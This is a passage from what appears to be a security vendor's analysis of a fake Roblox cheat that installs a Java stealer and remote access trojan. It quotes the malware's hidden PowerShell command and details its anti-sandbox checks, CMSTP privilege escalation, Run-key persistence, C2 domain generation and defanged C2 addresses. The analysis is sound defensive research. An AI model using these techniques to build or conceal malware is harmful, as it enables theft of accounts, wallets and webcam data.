Its components imitate real Xeno files, use Windows-style names and hide inside trusted-looking directories, which includes a folder associated with Xbox Game Bar, formerly Microsoft GameDVR.\u003C\u002Fp\u003E\u003Cp\u003EThe final payload goes far beyond conventional credential theft. It can steal browser cookies, Discord, Roblox and Minecraft accounts, cryptocurrency-wallet data and payment information.\u003C\u002Fp\u003E\u003Cp\u003EUnlike the more generic stealers, this one can also record keystrokes, access the webcam, stream the victim’s desktop, manipulate files, run PowerShell commands and give attackers interactive control of the infected computer.\u003C\u002Fp\u003E\u003Cp\u003ENewly identified command-and-control infrastructure and expanded functionality suggest the malware, previously documented as Powercat, remains under active development.\u003C\u002Fp\u003E\u003Cp\u003EThe campaign is particularly worrying because Roblox-related cheats can attract children and teenagers, potentially exposing accounts, private conversations, webcam images and financial information stored on shared family computers.\u003C\u002Fp\u003E\u003Ch2 id=\"key-findings\"\u003EKey findings\u003C\u002Fh2\u003E\u003Cul\u003E\u003Cli\u003EAttackers distribute the malware as an undetected version of the Xeno Roblox script executor through gaming forums and Discord communities.\u003C\u002Fli\u003E\u003Cli\u003EThe campaign uses a multi-stage Java infection chain with files, directories and persistence mechanisms that imitate legitimate Windows and gaming components.\u003C\u002Fli\u003E\u003Cli\u003EThe final payload combines information theft, surveillance, persistence, remote access, file manipulation and command execution.\u003C\u002Fli\u003E\u003Cli\u003EIts targets include Discord, Roblox and Minecraft accounts, browser data, cryptocurrency wallets and payment-related tokens.\u003C\u002Fli\u003E\u003Cli\u003EResearchers identified new command-and-control infrastructure and additional capabilities, suggesting continued development.\u003C\u002Fli\u003E\u003Cli\u003ESecurity insights show that users have been affected since the beginning of the year, with activity rising sharply in the second half of March.\u003C\u002Fli\u003E\u003C\u002Ful\u003E\u003Ch1 id=\"introduction\"\u003EIntroduction\u003C\u002Fh1\u003E\u003Cp\u003EGaming communities offer threat actors a fruitful environment for reaching potential victims. Players frequently exchange mods, scripts, and unofficial tools through forums, Discord servers and file-sharing websites.\u003C\u002Fp\u003E\u003Cp\u003EAttackers are all too aware of gamers’ habits. They can exploit this behavior by disguising malware as cheats or utilities that promise exclusive features, improved performance, or the ability to evade anti-cheat systems.\u003C\u002Fp\u003E\u003Cp\u003EBitdefender security researchers have identified a malware campaign targeting players searching for cheats for games such as Roblox. The campaign impersonates Xeno, a popular Roblox script executor used to automate actions and run custom scripts.\u003C\u002Fp\u003E\u003Cp\u003EBecause such tools are frequently detected or blocked by the game client, versions advertised as “undetected” can be particularly attractive to users seeking to bypass these restrictions.\u003C\u002Fp\u003E\u003Cp\u003EThe malicious packages are promoted through forums and Discord communities, either directly by the operators or through compromised and impersonated accounts.\u003C\u002Fp\u003E\u003Cp\u003EThroughout the infection chain, the malware tries to maintain a veneer of legitimacy. Its components imitate files from a Xeno installation, while later stages use Windows-like DLL names, trusted-looking directories and display-related persistence entries.\u003C\u002Fp\u003E\u003Cp\u003EThe final malware stage is a sophisticated stealer and remote access trojan that uses anti-analysis and anti-sandboxing techniques, which means that it’s trying hard not to be analyzed by security researchers.\u003C\u002Fp\u003E\u003Cp\u003EIt can steal browser cookies, personal accounts such as Discord, Roblox and Minecraft, and payment-related information that could lead to financial damage.\u003C\u002Fp\u003E\u003Cp\u003EThreatLocker researchers previously \u003Ca href=\"https:\u002F\u002Fwww.threatlocker.com\u002Fblog\u002Fpowercat-malware-campaign-fake-game-cheats-deliver-infostealer-targeting-discord-roblox-and-crypto-wallets\"\u003Edocumented\u003C\u002Fa\u003E this campaign under the name Powercat. Our insights revealed additional command-and-control domains and capabilities, which suggests that the malware remains under active development and continues to be used in cybercriminal operations.\u003C\u002Fp\u003E\u003Cp\u003EThe campaign has affected users since the beginning of the year. Activity increased significantly during the second half of March and has since maintained a relatively consistent infection rate.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002Fkillchain_java.drawio.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"561\" height=\"602\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 1. Java stealer killchain\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Ch2 id=\"initial-access-fake-xeno-cheats-and-stage-1-execution\"\u003EInitial Access: Fake Xeno Cheats and Stage 1 Execution\u003C\u002Fh2\u003E\u003Cp\u003EFor initial access, users are tricked into downloading fake game cheats, such as Xeno, a widely used cheat software for Roblox. The software packages often come either in the form of archives containing extraction and execution instructions or as self-extracting archives that automatically unpack and prepare the environment.\u003C\u002Fp\u003E\u003Cp\u003EThese archives use a directory structure that resembles a legitimate Xeno installation. File names are chosen to make the package look convincing to users expecting Roblox cheat software. Some files are indeed LUA scripts taken from a Xeno installation, while others, such as RbxAnalytics.png, are only small 10-byte files containing junk data.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-A1A65453-44F4-4F08-8B22-D71DB67EB39E--20260708-094739-1.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"333\" height=\"123\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 2. Mimicking a Xeno installation\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe user is then told to run the main entry point located at \u003Cem\u003E%LOCALAPPDATA%\\Xeno\\workspace\\cache\\xeno.exe\u003C\u002Fem\u003E, believing it will launch the expected game cheat. In reality, this is not the legitimate Xeno binary, but the first stage of the malware masquerading as it.\u003C\u002Fp\u003E\u003Cp\u003EFirst, xeno.exe checks whether a Java executable exists at %LOCALAPPDATA%\\Java\\jre\\bin\\javaw.exe. If the file is missing, it extracts a Java Runtime Environment to that path from an archive named instance.exe, using an embedded PowerShell command.\u003C\u002Fp\u003E\u003Cpre\u003E\u003Ccode class=\"language-bash\"\u003Epowershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory(...)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003ENext, xeno.exe reads the contents of \u003Cem\u003EXenoIcon.jpg\u003C\u002Fem\u003E, which contains the keys required by the second stage to validate its execution with the C2 server. Finally, it launches javaw.exe to execute a JAR file masquerading as \u003Cem\u003Edecompiler.exe\u003C\u002Fem\u003E, passing the contents of XenoIcon.jpg as command-line arguments.\u003C\u002Fp\u003E\u003Ch2 id=\"stage-2-decompilerexe-a-jar-disguised-as-a-windows-executable\"\u003EStage 2: decompiler.exe, a JAR Disguised as a Windows Executable\u003C\u002Fh2\u003E\u003Cp\u003EThe decompiler.exe file is a JAR file masquerading as a Windows executable. Its Java bytecode is obfuscated with the demo version of Allatori, a legitimate commercial obfuscation tool that the malware authors have abused. This can be at least partially deobfuscated, although the flow obfuscation is not fully reversible.\u003C\u002Fp\u003E\u003Cp\u003EThe class and variable names are also characteristic of Allatori, making the decompiled code harder to read. The main function begins by printing a banner to the console.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-FF1DD0FD-8D2E-4865-9B48-404CE9B56DF9--20260709-063310-1.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"385\" height=\"397\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 3. Allatori banner\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EIf the two required arguments are passed to the application, it starts collecting information about the environment in which it is running.\u003C\u002Fp\u003E\u003Cp\u003EThe malware looks for traces of debugging, artifacts that indicate sandbox execution, and information needed to validate the JAR execution.\u003C\u002Fp\u003E\u003Cp\u003EAfter gathering these details, it sends a POST request to the C2 server containing the collected flag values.\u003C\u002Fp\u003E\u003Cp\u003EThese values are used to register the victim machine and determine whether it should receive additional payloads.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-570BB6C5-ABCA-4E30-80D6-3BD4B77C4C7E--20260709-065550.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"646\" height=\"199\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-570BB6C5-ABCA-4E30-80D6-3BD4B77C4C7E--20260709-065550.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-570BB6C5-ABCA-4E30-80D6-3BD4B77C4C7E--20260709-065550.png 646w\"\u003E\u003Cfigcaption\u003E\u003Ca href=\"\"\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 4. Environment checking\u003C\u002Fspan\u003E\u003C\u002Fa\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EFor debug detection, the code checks runtime arguments such as \u003Cem\u003E-xdebug\u003C\u002Fem\u003E, \u003Cem\u003Esuspend=\u003C\u002Fem\u003E, and \u003Cem\u003Ejdwp\u003C\u002Fem\u003E, as well as modules appearing in stack traces, including \u003Cem\u003Eintellij\u003C\u002Fem\u003E, \u003Cem\u003Eeclipse.jdt\u003C\u002Fem\u003E, \u003Cem\u003Enetbeans\u003C\u002Fem\u003E, and \u003Cem\u003Ebytecodeviewer\u003C\u002Fem\u003E. If any of these strings are present, the code returns zero, causing the final flag value to fall below the threshold expected by the server.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-7A4D2C77-1448-4A8E-8E71-B631E4339C08--20260709-073147.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"814\" height=\"304\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-7A4D2C77-1448-4A8E-8E71-B631E4339C08--20260709-073147.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-7A4D2C77-1448-4A8E-8E71-B631E4339C08--20260709-073147.png 814w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 5. Checking current thread’s stack trace\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-BBC64CD0-7B83-442D-B708-4FE3FEA896D2--20260709-073346.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"673\" height=\"77\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-BBC64CD0-7B83-442D-B708-4FE3FEA896D2--20260709-073346.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-BBC64CD0-7B83-442D-B708-4FE3FEA896D2--20260709-073346.png 673w\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 6. Constructing the final value of the debug flag\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003ESandbox detection is performed through several checks. The malware verifies whether the disk partition size exceeds 20 GB, looks for well-known MAC addresses associated with emulated network adapters, checks the registry and WMI for virtual machine artifacts, and iterates over running processes to detect monitoring tools commonly used in automated analysis environments.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002Fimage-2.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"229\" height=\"163\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 7. Virtualization vendors checked\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-3010E6A5-E7FF-4A59-88FC-15B4FDD62E4F--20260709-074151.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"350\" height=\"344\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 8. Monitoring processes checked\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe function responsible for communicating with the C2 server receives a message as a parameter, creates a JSON object from it, opens a connection to \u003Cstrong\u003Ehxxps:\u002F\u002Fsolthere[.]net\u002Fjustacoolkat10\u003C\u002Fstrong\u003E, and sends the JSON object through a POST request.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-8070BC9D-F8BE-4732-BC96-B3D4ABCB9DE3--20260709-075203.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"741\" height=\"344\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-8070BC9D-F8BE-4732-BC96-B3D4ABCB9DE3--20260709-075203.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-8070BC9D-F8BE-4732-BC96-B3D4ABCB9DE3--20260709-075203.png 741w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 9. Post request to C2\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EAfter this initial logging, the code calls another function that connects to the C2 server through a different endpoint and sends the key received through the command-line arguments for validation.\u003C\u002Fp\u003E\u003Cp\u003EThe URL used for payload retrieval is \u003Cstrong\u003Ehxxps:\u002F\u002Fsolthere[.]net\u002Fapi\u002Fv1\u002Fredeem\u003C\u002Fstrong\u003E. The key is encrypted with AES, and the resulting buffer is Base64-encoded before being sent in the POST request body.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-86A13ADB-11AE-4382-9DAE-65AED462C29A--20260709-080001.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"690\" height=\"163\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-86A13ADB-11AE-4382-9DAE-65AED462C29A--20260709-080001.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-86A13ADB-11AE-4382-9DAE-65AED462C29A--20260709-080001.png 690w\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 10. Redeem API\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-64E4A3AB-A34A-49AA-9E55-C1D465A48A83--20260709-080951.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"812\" height=\"414\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-64E4A3AB-A34A-49AA-9E55-C1D465A48A83--20260709-080951.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-64E4A3AB-A34A-49AA-9E55-C1D465A48A83--20260709-080951.png 812w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 11. Communicating with the API of the C2\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe retrieved payload is then loaded using the \u003Cem\u003EloadClass\u003C\u002Fem\u003E method. Its entry point is identified by iterating through all methods of the received object.\u003C\u002Fp\u003E\u003Cp\u003EOnce the entry point is found, it is invoked through \u003Cem\u003Emethod.invoke()\u003C\u002Fem\u003E. This payload then downloads and writes the third stage to %LOCALAPPDATA%\\Microsoft\\GameDVR.\u003C\u002Fp\u003E\u003Cp\u003ETo execute it, the malware launches a new javaw.exe process and passes the path of the JAR file as an argument.\u003C\u002Fp\u003E\u003Ch2 id=\"stage-3-a-java-stealer-masquerading-as-a-windows-dll\"\u003EStage 3: A Java Stealer Masquerading as a Windows DLL\u003C\u002Fh2\u003E\u003Cp\u003EThe third stage is a Java-based stealer and surveillance malware that can collect personal information from browsers, Discord, and games. It can also collect screenshots and webcam footage, stream the victim’s desktop, and monitor keyboard and mouse activity.\u003C\u002Fp\u003E\u003Cp\u003EIn addition, it can download and upload files, execute commands through PowerShell, and open an interactive shell for hands-on-keyboard access, allowing full system takeover.\u003C\u002Fp\u003E\u003Cp\u003EThe JAR file masquerades as a seemingly legitimate DLL located in %LOCALAPPDATA%\\Microsoft\\GameDVR. The possible DLL names mimic legitimate Windows DLLs that normally reside in the Windows directory.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-31700A5E-EF54-445C-877C-6BA3D8ADE4F0--20260709-093052.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"538\" height=\"127\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 12. Possible masquerading DLL names\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EUpon execution, the malware checks the environment in a similar fashion to the second stage. However, instead of sending the collected information to the C2 server, it terminates if a sandbox is detected.\u003C\u002Fp\u003E\u003Cp\u003EThe malware also creates a local log file named \u003Cem\u003E-ntcache\u003C\u002Fem\u003E in the current user’s home directory, where it records execution progress with timestamps.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-D0966235-CDFC-4325-BF0C-6DE5D0877074--20260709-093937.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"968\" height=\"489\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-D0966235-CDFC-4325-BF0C-6DE5D0877074--20260709-093937.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-D0966235-CDFC-4325-BF0C-6DE5D0877074--20260709-093937.png 968w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 13. Logging function\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EAfter that, the malware attempts to move execution to a CMSTP process with elevated privileges. If privilege escalation succeeds, the low-privilege javaw.exe process terminates. If privilege escalation fails, execution continues.\u003C\u002Fp\u003E\u003Cp\u003EThe subsequent malware flow appears to be the same in both elevated and non-elevated contexts.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-1A951009-6C57-4EA5-94B6-BB95B6742ABB--20260709-094913.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1768\" height=\"519\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-1A951009-6C57-4EA5-94B6-BB95B6742ABB--20260709-094913.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002F-1A951009-6C57-4EA5-94B6-BB95B6742ABB--20260709-094913.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1600\u002F2026\u002F08\u002F-1A951009-6C57-4EA5-94B6-BB95B6742ABB--20260709-094913.png 1600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-1A951009-6C57-4EA5-94B6-BB95B6742ABB--20260709-094913.png 1768w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 14. Privilege escalation via CMSTP\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe malware then contacts two online services that can identify IP addresses (ipapi[.]co and ipwho[.]is) to obtain geolocation information about the victim. This information is later used during the C2 connection process to generate a unique identifier based on the system’s hardware profile.\u003C\u002Fp\u003E\u003Cp\u003EPersistence is established by adding the command line that runs the JAR file to the Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key under the name Display Calibration.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-1D9F9688-6A65-4C96-9032-48A7DB92390C--20260709-095631.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1393\" height=\"330\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-1D9F9688-6A65-4C96-9032-48A7DB92390C--20260709-095631.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002F-1D9F9688-6A65-4C96-9032-48A7DB92390C--20260709-095631.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-1D9F9688-6A65-4C96-9032-48A7DB92390C--20260709-095631.png 1393w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 15. Persistence via Run key\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe malware then enables the Run entry by setting Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run for Display Calibration to the value 2.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-4A66EF79-300E-4387-8F6B-2B4716D18155--20260709-095911.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1449\" height=\"179\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-4A66EF79-300E-4387-8F6B-2B4716D18155--20260709-095911.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002F-4A66EF79-300E-4387-8F6B-2B4716D18155--20260709-095911.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-4A66EF79-300E-4387-8F6B-2B4716D18155--20260709-095911.png 1449w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 16. Enabling persistence\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EOnce persistence is enabled, it starts two threads responsible for collecting and sending crypto wallet data stolen from Exodus wallets. It then calls the function that creates a WebSocket connection to the C2 server.\u003C\u002Fp\u003E\u003Cp\u003EThe server URI is generated at runtime by calculating the SHA-256 hash of the string \u003Cem\u003Eprint\u003C\u002Fem\u003E, removing the last character, and appending \u003Cem\u003E.xyz\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\u003Cp\u003EThus, the resulting C2 address is \u003Cstrong\u003Ece953a0eb08246617b7f849486c4b26a7af37e9d2e8f0e13b3ae1bf0da8a70a[.]xyz\u003C\u002Fstrong\u003E. The management server then assigns a subdomain to the client and responds with the string needed to build the full URI. The client can only connect to the C2 through that URI for the active session.\u003C\u002Fp\u003E\u003Cp\u003EOnce the connection is established, the server can send two types of data over the socket. The first type is an updated JAR file. The received bytes are written to %LOCALAPPDATA%\\Microsoft\\GameDVR using one of the DLL-like names from the malware’s list of possible masquerading filenames.\u003C\u002Fp\u003E\u003Cp\u003EThe new version is then executed using the \u003Cem\u003Eexec \u003C\u002Fem\u003Emethod, while the old version terminates by calling \u003Cem\u003Ehalt\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-0A6B86C2-EB20-4E2E-A36A-6AAC3CF00C87--20260709-115901.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"1151\" height=\"345\" srcset=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw600\u002F2026\u002F08\u002F-0A6B86C2-EB20-4E2E-A36A-6AAC3CF00C87--20260709-115901.png 600w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002Fsize\u002Fw1000\u002F2026\u002F08\u002F-0A6B86C2-EB20-4E2E-A36A-6AAC3CF00C87--20260709-115901.png 1000w, https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-0A6B86C2-EB20-4E2E-A36A-6AAC3CF00C87--20260709-115901.png 1151w\" sizes=\"(min-width: 720px) 720px\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 17. JAR update mechanism\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThe second response type is an encrypted string. Once decrypted, it contains a JSON object with a task identifier and its parameters. The task identifier acts as an index in an array of possible actions.\u003C\u002Fp\u003E\u003Cp\u003EBy analyzing all functions in this array, we uncovered the malware’s capabilities.\u003C\u002Fp\u003E\u003Cfigure class=\"kg-card kg-image-card kg-card-hascaption\"\u003E\u003Cimg src=\"https:\u002F\u002Fblogapp.bitdefender.com\u002Flabs\u002Fcontent\u002Fimages\u002F2026\u002F08\u002F-D86CD82B-6966-4F76-8E27-C3629047356E--20260709-122940.png\" class=\"kg-image\" alt=\"\" loading=\"lazy\" width=\"466\" height=\"487\"\u003E\u003Cfigcaption\u003E\u003Cspan style=\"white-space: pre-wrap;\"\u003EFig. 18. Possible actions\u003C\u002Fspan\u003E\u003C\u002Ffigcaption\u003E\u003C\u002Ffigure\u003E\u003Cp\u003EThese commands can be grouped into several broader categories: connection management, surveillance, file system operations, personal information theft, shell access, and command execution.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EConnection management\u003C\u002Fstrong\u003E actions include performing a handshake with a secret string and validating that the client is communicating over the expected socket. The server can also instruct the client to open a new connection on a new socket.\u003C\u002Fp\u003E\u003Cp\u003E\u003Cstrong\u003EFile system commands\u003C\u002Fstrong\u003E include standard directory listing, upload, download, and rename operations. 